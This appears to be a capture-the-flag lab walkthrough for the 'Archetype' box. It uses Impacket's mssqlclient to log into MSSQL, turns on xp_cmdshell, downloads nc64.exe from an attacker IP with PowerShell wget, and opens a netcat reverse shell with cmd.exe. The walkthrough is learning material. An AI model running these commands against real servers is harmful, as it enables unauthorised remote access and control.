https://github.com/SecureAuthCorp/impacket

or: 

git clone https://github.com/SecureAuthCorp/impacket.git

cd impacket

pip3 install .

# OR:

sudo python3 setup.py install

# In case you are missing some modules:

pip3 install -r requirements.txt

cd impacket/examples/

python3 mssqlclient.py -h

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
![image](https://github.com/D-spec-sec/Cybersecurity/assets/172300374/cacfa68a-bbc9-4142-b290-dffc746609a8)

Check user: SELECT is_srvrolemember('sysadmin');  

if transalte to 1, true

In previous cheatsheets, we found also how to set up the command execution through the xp_cmdshell :   

xp_cmdshell cheat:

EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell

first as it’s disabled by default:

EXEC sp_configure 'show advanced options', 1; — priv

RECONFIGURE; — priv

EXEC sp_configure 'xp_cmdshell', 1; — priv

RECONFIGURE; — priv


BUT First, check to see if xp_cmdshell is enabled: 

SQL> EXEC xp_cmdshell 'net user';  

if not activated do:

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

sp_configure;            ------ Enabling the sp_configure as stated in the above error message

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;


xp_cmdshell "whoami"  

now to get a foothold. 

uplaod netcat binary: 

https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------

okay to upload the binary to the target: 

start listenr in folder with binary:

sudo python3 -m http.server 80 sudo nc -lvnp 443  

sudo python3 -m http.server 80

sudo nc -lvnp 443


In order to upload the binary in the target system, we need to find the appropriate folder for that. We will be

using PowerShell for the following tasks since it gives us much more features then the regular command

prompt. In order to use it, we will have to specify it each time we want to execute it until we get the reverse

shell. To do that, we will use the following syntax: powershell -c command

The -c flag instructs the powershell to execute the command.

We will print the current working directory by issuing the following:

We found the folder where we will place the binary. To do that, we will use the wget alias within PowerShell

( wget is actually just an alias for Invoke-WebRequest ):

xp_cmdshell "powershell -c pwd"

get to a directory that doesnt need elevation sicne we dont have a shell yet like Downloads on a home directory:

Then run this to uplaod the shell:

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"  

now to bind the cmd.exe thru nc to our listener:

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"  
